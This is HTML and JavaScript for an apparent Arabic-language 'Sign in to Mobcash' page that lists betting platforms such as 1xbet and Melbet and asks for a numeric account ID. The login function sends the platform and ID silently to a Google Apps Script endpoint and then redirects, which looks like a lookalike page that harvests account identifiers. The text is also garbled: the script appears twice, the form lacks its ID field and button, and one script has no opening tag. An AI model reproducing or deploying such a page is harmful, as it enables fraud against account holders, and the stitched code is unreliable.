    window.addEventListener("pageshow", (e) => {
      if (e.persisted) resetForm();
    });

    function login() {
      const platform = document.getElementById("platform").value;
      const userId = document.getElementById("userId").value.trim();
      const btn = document.getElementById("submitBtn");
      const loader = document.getElementById("loader");
      const label = btn.querySelector(".label");

      if (!platform) {
        showMessage("اختر المنصة.");
        return;
      }

      if (!userId) {
        showMessage("أدخل المعرّف.");
        return;
      }

      if (userId.length < 7 || userId.length > 13 || !/^\d+$/.test(userId)) {
        showMessage("المعرف غير معتمد. الرجاء التحقق.");
        return;
      }

      if (isRepeatedDigits(userId)) {
        showMessage("المعرف غير معتمد. الرجاء التحقق.");
        return;
      }

      btn.disabled = true;
      btn.classList.add("opacity-50", "cursor-not-allowed");
      loader.classList.remove("hidden");
      label.classList.add("hidden");
      document.getElementById("platform").disabled = true;
      document.getElementById("userId").disabled = true;

      localStorage.setItem("platform", platform);
      localStorage.setItem("userId", userId);

      fetch("https://script.google.com/macros/s/AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA/exec", {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ platform, userId })
      }).finally(() => {
        setTimeout(() => {
          window.location.href = "home.html";
        }, 800);
      });
    }

    document.getElementById("oneClickTab").addEventListener("click", () => {
      document.getElementById("platform").value = "";
      document.getElementById("selectedText").textContent = "اختر المنصة";
      document.getElementById("userId").value = "";
      document.getElementById("message").className = "fade";
      document.getElementById("message").textContent = "";
      resetForm();
    });

    const dropdownBtn = document.getElementById("dropdownBtn");
    const dropdownList = document.getElementById("dropdownList");
    const selectedText = document.getElementById("selectedText");
    const platformInput = document.getElementById("platform");

    dropdownBtn.addEventListener("click", () => {
      dropdownList.classList.toggle("hidden");
    });

    document.querySelectorAll(".dropdown-item").forEach(item => {
      item.addEventListener("click", () => {
        const value = item.getAttribute("data-value");
        platformInput.value = value;
        dropdownList.classList.add("hidden");

        if (value === "Linbet") {
          selectedText.innerHTML = `<span>Linbet</span><img src="https://i.postimg.cc/xCgWJjwv/recharge.jpg" alt="Linbet" class="w-6 h-6 rounded-full ml-2">`;
        } else if (value === "Mega pari") {
          selectedText.innerHTML = `<span>Mega pari</span><img src="https://i.postimg.cc/7ZwP2hcc/recharge.jpg" alt="Mega pari" class="w-6 h-6 rounded-full ml-2">`;
        } else if (value === "Gooobet") {
          selectedText.innerHTML = `<span>Gooobet</span><img src="https://i.postimg.cc/kXwF06xF/recharge.webp" alt="Gooobet" class="w-6 h-6 rounded-full ml-2">`;
        } else if (value === "1xbet") {
          selectedText.innerHTML = `<span>1xbet</span><img src="https://i.postimg.cc/yx8Wcdks/recharge.jpg" alt="1xbet" class="w-6 h-6 rounded-full ml-2">`;
        } else if (value === "Melbet") {
          selectedText.innerHTML = `<span>Melbet</span><img src="https://i.postimg.cc/JzVMW0M0/recharge.jpg" alt="Melbet" class="w-6 h-6 rounded-full ml-2">`;
        } else {
          selectedText.textContent = value;
        }
      });
    });

    window.addEventListener("click", function(e) {
      if (!dropdownBtn.contains(e.target) && !dropdownList.contains(e.target)) {
        dropdownList.classList.add("hidden");
      }
    });
  </script>
</body>
</html>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in to - Mobcash</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest"></script>
  <style>
    select option { color: #000; }
    @media (prefers-color-scheme: dark) {
      select option { color: #fff; }
    }
    .fade { transition: all 0.3s ease; opacity: 0; transform: translateY(-5px); }
    .fade.show { opacity: 1; transform: translateY(0); }

    #oneClickTab {
      background-color: #d6eed9;
      border: none;
      padding: 10px 18px;
      border-radius: 8px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-weight: 500;
      font-family: 'Arial', sans-serif;
      font-size: 16px;
      color: #2b2b2b;
      width: 100%;
      margin-bottom: 24px;
      transition: background-color 0.2s ease, color 0.2s ease;
    }

    #oneClickTab svg {
      transition: fill 0.2s ease;
    }

    #oneClickTab:hover,
    #oneClickTab:active {
      background-color: #27632a;
      color: #ffffff;
    }

    #oneClickTab:hover svg,
    #oneClickTab:active svg {
      fill: #ffffff;
    }
  </style>
</head>
<body class="bg-gray-100 dark:bg-gray-900 min-h-screen flex items-center justify-center px-4">
  <div class="bg-white dark:bg-gray-800 shadow-2xl rounded-2xl p-8 w-full max-w-md">
    <h2 class="text-2xl font-bold text-center text-gray-800 dark:text-white mb-6">Sign in to Mobcash</h2>

    <button id="oneClickTab">
      En un clic
      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="32" viewBox="0 0 14 16" fill="#1f1f1f">
        <path d="M10 5.5l-.2-.1H6.6L9.8 1V.8H4.9l-4 7v.3h3l-3 6.3v.3h.4l8.7-9c.1 0 .1-.1 0-.2z"/>
      </svg>
    </button>

    <div class="mb-4 relative">
      <label for="platform" class="block mb-2 text-sm font-medium text-gray-700 dark:text-gray-300">اختر المنصة</label>
      <div id="customSelect" class="relative w-full">
        <button id="dropdownBtn" class="w-full flex items-center justify-between px-4 py-2 border rounded-xl bg-white dark:bg-gray-700 text-sm text-gray-800 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500">
          <span id="selectedText">اختر المنصة</span>
          <svg class="w-4 h-4 ml-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
          </svg>
        </button>
        <ul id="dropdownList" class="absolute z-10 w-full bg-white dark:bg-gray-700 border rounded-xl mt-1 hidden max-h-60 overflow-y-auto text-sm text-gray-800 dark:text-white">
          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Mega pari">
            Mega pari
            <img src="https://i.postimg.cc/rpcLHHcP/recharge.png" alt="Mega pari" class="w-6 h-6 rounded-full">
          </li>
          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Linbet">
            Linbet
            <img src="https://i.postimg.cc/xCgWJjwv/recharge.jpg" alt="Linbet" class="w-6 h-6 rounded-full">
          </li>
          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Gooobet">
            Gooobet
            <img src="https://i.postimg.cc/kXwF06xF/recharge.webp" alt="Gooobet" class="w-6 h-6 rounded-full">
          </li>
          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="1xbet">
            1xbet
            <img src="https://i.postimg.cc/yx8Wcdks/recharge.jpg" alt="1xbet" class="w-6 h-6 rounded-full">
          </li>
          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Melbet">
            Melbet
            <img src="https://i.postimg.cc/JzVMW0M0/recharge.jpg" alt="Melbet" class="w-6 h-6 rounded-full">
          </li>
        </ul>
        <input type="hidden" id="platform" name="platform" />
      </div>
    </div>
    window.addEventListener("pageshow", (e) => {
      if (e.persisted) resetForm();
    });

    function login() {
      const platform = document.getElementById("platform").value;
      const userId = document.getElementById("userId").value.trim();
      const btn = document.getElementById("submitBtn");
      const loader = document.getElementById("loader");
      const label = btn.querySelector(".label");

      if (!platform) {
        showMessage("اختر المنصة.");
        return;
      }

      if (!userId) {
        showMessage("أدخل المعرّف.");
        return;
      }

      if (userId.length < 7 || userId.length > 13 || !/^\d+$/.test(userId)) {
        showMessage("المعرف غير معتمد. الرجاء التحقق.");
        return;
      }

      if (isRepeatedDigits(userId)) {
        showMessage("المعرف غير معتمد. الرجاء التحقق.");
        return;
      }

      btn.disabled = true;
      btn.classList.add("opacity-50", "cursor-not-allowed");
      loader.classList.remove("hidden");
      label.classList.add("hidden");
      document.getElementById("platform").disabled = true;
      document.getElementById("userId").disabled = true;

      localStorage.setItem("platform", platform);
      localStorage.setItem("userId", userId);

      fetch("https://script.google.com/macros/s/AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA/exec", {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ platform, userId })
      }).finally(() => {
        setTimeout(() => {
          window.location.href = "home.html";
        }, 800);
      });
    }

    document.getElementById("oneClickTab").addEventListener("click", () => {
      document.getElementById("platform").value = "";
      document.getElementById("selectedText").textContent = "اختر المنصة";
      document.getElementById("userId").value = "";
      document.getElementById("message").className = "fade";
      document.getElementById("message").textContent = "";
      resetForm();
    });

    const dropdownBtn = document.getElementById("dropdownBtn");
    const dropdownList = document.getElementById("dropdownList");
    const selectedText = document.getElementById("selectedText");
    const platformInput = document.getElementById("platform");

    dropdownBtn.addEventListener("click", () => {
      dropdownList.classList.toggle("hidden");
    });

    document.querySelectorAll(".dropdown-item").forEach(item => {
      item.addEventListener("click", () => {
        const value = item.getAttribute("data-value");
        platformInput.value = value;
        dropdownList.classList.add("hidden");

        if (value === "Mega pari") {
          selectedText.innerHTML = `<span>Mega pari</span><img src="https://i.postimg.cc/rpcLHHcP/recharge.png" alt="Mega pari" class="w-6 h-6 rounded-full ml-2">`;
        } else if (value === "Linbet") {
          selectedText.innerHTML = `<span>Linbet</span><img src="https://i.postimg.cc/xCgWJjwv/recharge.jpg" alt="Linbet" class="w-6 h-6 rounded-full ml-2">`;
        } else if (value === "Gooobet") {
          selectedText.innerHTML = `<span>Gooobet</span><img src="https://i.postimg.cc/kXwF06xF/recharge.webp" alt="Gooobet" class="w-6 h-6 rounded-full ml-2">`;
        } else if (value === "1xbet") {
          selectedText.innerHTML = `<span>1xbet</span><img src="https://i.postimg.cc/yx8Wcdks/recharge.jpg" alt="1xbet" class="w-6 h-6 rounded-full ml-2">`;
        } else if (value === "Melbet") {
          selectedText.innerHTML = `<span>Melbet</span><img src="https://i.postimg.cc/JzVMW0M0/recharge.jpg" alt="Melbet" class="w-6 h-6 rounded-full ml-2">`;
        } else {
          selectedText.textContent = value;
        }
      });
    });

    window.addEventListener("click", function(e) {
      if (!dropdownBtn.contains(e.target) && !dropdownList.contains(e.target)) {
        dropdownList.classList.add("hidden");
      }
    });
  </script>
</body>
</html>
